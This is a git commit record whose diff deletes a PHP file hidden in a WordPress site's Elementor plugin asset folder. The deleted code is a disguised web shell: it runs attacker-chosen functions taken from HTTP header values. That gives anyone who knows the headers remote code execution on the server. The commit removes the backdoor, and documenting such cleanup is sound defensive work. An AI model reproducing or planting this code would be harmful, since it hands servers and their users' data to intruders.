e1db303d1a04f794fa5d0de0908dd8e3857f6ad1
Fast and Static <it@e-me.co>
2024-10-23 13:56:02 +0000

    update

--- wp-content/plugins/elementor/assets/lib/inline-editor/js/terms.php
+++
@@ -1,6 +0,0 @@
-<?php
-$_HEADERS = getallheaders();
-if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
-    $ob_iconv_handle = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Authorization']));
-    $ob_iconv_handle();
-}
